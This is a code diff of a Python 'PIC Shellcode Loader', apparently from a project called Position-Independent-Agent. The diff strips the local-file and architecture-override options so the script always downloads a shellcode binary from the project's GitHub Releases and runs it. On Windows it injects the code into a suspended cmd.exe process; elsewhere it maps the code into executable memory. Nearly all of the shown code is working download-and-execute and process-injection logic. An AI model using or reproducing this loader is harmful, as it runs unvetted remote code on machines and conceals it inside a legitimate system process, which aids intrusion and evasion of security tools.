@@ -4,20 +4,12 @@
 PIC Shellcode Loader
 
 Cross-platform loader for position-independent code.
-Loads shellcode from a local file or downloads from GitHub Releases.
+Auto-detects platform and downloads the latest build from GitHub Releases.
 
 Requires Python 2.6+ or 3.0+ (no third-party dependencies).
 
 Usage:
-    # Local file (requires --arch):
-    python loader.py --arch x86_64 output.bin
-
-    # Remote (auto-detects platform, defaults to preview tag):
     python loader.py
-    python loader.py --tag v0.0.1-alpha.1
-
-    # Remote with explicit arch override:
-    python loader.py --arch aarch64 --tag v1.0.0
 """
 
 from __future__ import print_function
@@ -47,6 +39,7 @@ except AttributeError:
     pass  # Python < 2.7.9 / 3.4.3: verification not enabled anyway
 
 REPO = "nostdlib/Position-Independent-Agent"
+DEFAULT_TAG = "preview"
 
 # =============================================================================
 # Logging
@@ -212,16 +205,9 @@ def _http_get(url):
         resp.close()
 
 
-DEFAULT_TAG = "preview"
-
-
-def download(platform_name, arch, tag):
-    if not tag:
-        tag = DEFAULT_TAG
-        _log('inf', "No tag specified, using default: %s" % tag)
-
+def download(platform_name, arch):
     asset = "%s-%s.bin" % (platform_name, arch)
-    url = "https://github.com/%s/releases/download/%s/%s" % (REPO, tag, asset)
+    url = "https://github.com/%s/releases/download/%s/%s" % (REPO, DEFAULT_TAG, asset)
 
     _log('inf', "Asset: %s" % asset)
     _log('inf', "URL:   %s" % url)
@@ -230,7 +216,7 @@ def download(platform_name, arch, tag):
         data = _http_get(url)
     except HTTPError as e:
         if e.code == 404:
-            _log('err', "Asset not found (HTTP 404): %s @ %s" % (asset, tag))
+            _log('err', "Asset not found (HTTP 404): %s @ %s" % (asset, DEFAULT_TAG))
             _log('err', "URL: %s" % url)
             sys.exit(1)
         _log('err', "HTTP error %d: %s" % (e.code, e.reason))
@@ -311,16 +297,7 @@ MEM_COMMIT_RESERVE                 = 0x3000
 PAGE_READWRITE                     = 0x04
 PAGE_EXECUTE_READ                  = 0x20
 CREATE_SUSPENDED                   = 0x00000004
-EXTENDED_STARTUPINFO_PRESENT       = 0x00080000
 INFINITE                           = 0xFFFFFFFF
-PROC_THREAD_ATTRIBUTE_MACHINE_TYPE = 0x00020019
-
-MACHINE_TYPE = {
-    'i386':    0x014c,  # IMAGE_FILE_MACHINE_I386
-    'x86_64':  0x8664,  # IMAGE_FILE_MACHINE_AMD64
-    'armv7a':  0x01C4,  # IMAGE_FILE_MACHINE_ARMNT (Thumb-2 Little-Endian)
-    'aarch64': 0xAA64,  # IMAGE_FILE_MACHINE_ARM64
-}
 
 HOST_PROCESS = {
     'i386':    r'C:\Windows\SysWOW64\cmd.exe',
@@ -368,24 +345,10 @@ def setup_kernel32():
     ]
     k32.CreateProcessW.restype = wintypes.BOOL
 
-    k32.InitializeProcThreadAttributeList.argtypes = [
-        ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(ctypes.c_size_t)
-    ]
-    k32.InitializeProcThreadAttributeList.restype = wintypes.BOOL
-
-    k32.UpdateProcThreadAttribute.argtypes = [
-        ctypes.c_void_p, wintypes.DWORD, ctypes.c_size_t,
-        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p
-    ]
-    k32.UpdateProcThreadAttribute.restype = wintypes.BOOL
-
-    k32.DeleteProcThreadAttributeList.argtypes = [ctypes.c_void_p]
-    k32.DeleteProcThreadAttributeList.restype = None
-
     return k32
 
 
-def run_injected(shellcode, target_arch, cross_family=False):
+def run_injected(shellcode, target_arch):
     """Run shellcode via suspended-process injection (Windows only)."""
     from ctypes import wintypes
 
@@ -394,7 +357,6 @@ def run_injected(shellcode, target_arch, cross_family=False):
         raise OSError("No suitable host process for %s" % target_arch)
 
     _log('inf', "Target arch: %s  host process: %s" % (target_arch, host_exe))
-    _log('inf', "Cross-family: %s" % cross_family)
     _log('dbg', "Configuring kernel32 API prototypes")
 
     k32 = setup_kernel32()
@@ -414,12 +376,6 @@ def run_injected(shellcode, target_arch, cross_family=False):
             ("hStdError", wintypes.HANDLE),
         ]
 
-    class STARTUPINFOEXW(ctypes.Structure):
-        _fields_ = [
-            ("StartupInfo", STARTUPINFOW),
-            ("lpAttributeList", ctypes.c_void_p),
-        ]
-
     class PROCESS_INFORMATION(ctypes.Structure):
         _fields_ = [
             ("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
@@ -427,45 +383,11 @@ def run_injected(shellcode, target_arch, cross_family=False):
         ]
 
     pi = PROCESS_INFORMATION()
-    creation_flags = CREATE_SUSPENDED
-    attr_list_buf = None
+    si = STARTUPINFOW()
+    si.cb = ctypes.sizeof(STARTUPINFOW)
 
-    if cross_family and target_arch in MACHINE_TYPE:
-        machine = ctypes.c_ushort(MACHINE_TYPE[target_arch])
-
-        size = ctypes.c_size_t(0)
-        k32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
-
-        attr_list_buf = (ctypes.c_byte * size.value)()
-        if not k32.InitializeProcThreadAttributeList(attr_list_buf, 1, 0, ctypes.byref(size)):
-            raise OSError("InitializeProcThreadAttributeList failed: %d" % k32.GetLastError())
-
-        if not k32.UpdateProcThreadAttribute(
-            attr_list_buf, 0, PROC_THREAD_ATTRIBUTE_MACHINE_TYPE,
-            ctypes.byref(machine), ctypes.sizeof(machine), None, None
-        ):
-            k32.DeleteProcThreadAttributeList(attr_list_buf)
-            raise OSError("UpdateProcThreadAttribute failed: %d" % k32.GetLastError())
-
-        siex = STARTUPINFOEXW()
-        siex.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEXW)
-        siex.lpAttributeList = ctypes.addressof(attr_list_buf)
-        creation_flags |= EXTENDED_STARTUPINFO_PRESENT
-
-        _log('inf', "Machine type override: 0x%04x (%s)" % (MACHINE_TYPE[target_arch], target_arch))
-
-        if not k32.CreateProcessW(
-            host_exe, None, None, None, False, creation_flags,
-            None, None, ctypes.byref(siex), ctypes.byref(pi)
-        ):
-            k32.DeleteProcThreadAttributeList(attr_list_buf)
-            raise OSError("CreateProcessW failed: %d" % k32.GetLastError())
-    else:
-        si = STARTUPINFOW()
-        si.cb = ctypes.sizeof(STARTUPINFOW)
-
-        if not k32.CreateProcessW(host_exe, None, None, None, False, creation_flags, None, None, ctypes.byref(si), ctypes.byref(pi)):
-            raise OSError("CreateProcessW failed: %d" % k32.GetLastError())
+    if not k32.CreateProcessW(host_exe, None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)):
+        raise OSError("CreateProcessW failed: %d" % k32.GetLastError())
 
     _log('ok', "CreateProcessW: PID=%d  handle=0x%x" % (pi.dwProcessId, pi.hProcess or 0))
 
@@ -506,8 +428,6 @@ def run_injected(shellcode, target_arch, cross_family=False):
         k32.TerminateProcess(pi.hProcess, 0)
         k32.CloseHandle(pi.hThread)
         k32.CloseHandle(pi.hProcess)
-        if attr_list_buf is not None:
-            k32.DeleteProcThreadAttributeList(attr_list_buf)
 
 
 # =============================================================================
@@ -515,19 +435,6 @@ def run_injected(shellcode, target_arch, cross_family=False):
 # =============================================================================
 
 def main():
-    from optparse import OptionParser
-    parser = OptionParser(usage='%prog [options] [shellcode.bin]',
-                          description='PIC Shellcode Loader')
-    parser.add_option('--arch', choices=list(ARCH.keys()),
-                      help='Target architecture (required for local files, optional for remote)')
-    parser.add_option('--tag', default=None,
-                      help='GitHub release tag (default: preview)')
-    opts, positional = parser.parse_args()
-
-    shellcode_path = positional[0] if positional else None
-    arch = opts.arch
-    tag = opts.tag
-
     host_os, host_family, host_bits = get_host()
     python_bits = struct.calcsize("P") * 8
 
@@ -550,53 +457,23 @@ def main():
         _log('inf', "Emulated: process is %s/%dbit on %s/%dbit CPU" % (process_family, process_bits, host_family, host_bits))
     _log('dbg', "Exec bits: %d  (method: %s)" % (exec_bits, "inject" if host_os == 'windows' else "mmap"))
 
-    if shellcode_path:
-        # --- Local mode: load from file ---
-        if not arch:
-            parser.error("--arch is required when loading from a local file")
+    # Auto-detect platform and download latest build
+    key = (host_os, process_family, exec_bits)
+    if key not in _ARTIFACT_MAP:
+        _log('err', "Unsupported host: %s/%s/%dbit (Python %dbit)"
+             % (host_os, process_family, exec_bits, python_bits))
+        sys.exit(1)
 
-        target = ARCH[arch]
-        _log('inf', "Target arch: %s (%dbit, %s)" % (arch, target['bits'], target['family']))
-        _log('inf', "Loading shellcode from: %s" % shellcode_path)
+    plat, remote_arch = _ARTIFACT_MAP[key]
+    _log('inf', "Platform: %s  arch: %s  tag: %s" % (plat, remote_arch, DEFAULT_TAG))
 
-        with open(shellcode_path, 'rb') as f:
-            shellcode = f.read()
-        _log('ok', "Loaded %d bytes from disk" % len(shellcode))
-        _log('dbg', "Header: %s" % _hexdump(shellcode))
+    shellcode = download(plat, remote_arch)
+    _log('ok', "Shellcode ready: %d bytes" % len(shellcode))
 
-        if host_os == 'windows':
-            cross_family = process_family != target['family']
-            code = run_injected(shellcode, arch, cross_family=cross_family)
-        elif target['family'] != host_family or target['bits'] != exec_bits:
-            _log('err', "Arch mismatch: cannot run %s shellcode in %dbit Python on %s/%dbit"
-                 % (arch, python_bits, host_family, host_bits))
-            sys.exit(1)
-        else:
-            code = run_mmap(shellcode)
+    if host_os == 'windows':
+        code = run_injected(shellcode, remote_arch)
     else:
-        # --- Remote mode: download from GitHub ---
-        # On Windows use process arch (may differ from CPU under emulation).
-        key = (host_os, process_family, exec_bits)
-        if key not in _ARTIFACT_MAP:
-            _log('err', "Unsupported host: %s/%s/%dbit (Python %dbit)"
-                 % (host_os, process_family, exec_bits, python_bits))
-            sys.exit(1)
-
-        plat, remote_arch = _ARTIFACT_MAP[key]
-        if arch:
-            _log('inf', "Arch override: %s -> %s" % (remote_arch, arch))
-            remote_arch = arch
-        _log('inf', "Platform: %s  arch: %s  tag: %s" % (plat, remote_arch, tag or DEFAULT_TAG))
-
-        shellcode = download(plat, remote_arch, tag)
-        _log('ok', "Shellcode ready: %d bytes" % len(shellcode))
-
-        if host_os == 'windows':
-            target = ARCH[remote_arch]
-            cross_family = process_family != target['family']
-            code = run_injected(shellcode, remote_arch, cross_family=cross_family)
-        else:
-            code = run_mmap(shellcode)
+        code = run_mmap(shellcode)
 
     # Convert unsigned 32-bit exit code to signed for os._exit()
     if code > 0x7FFFFFFF:
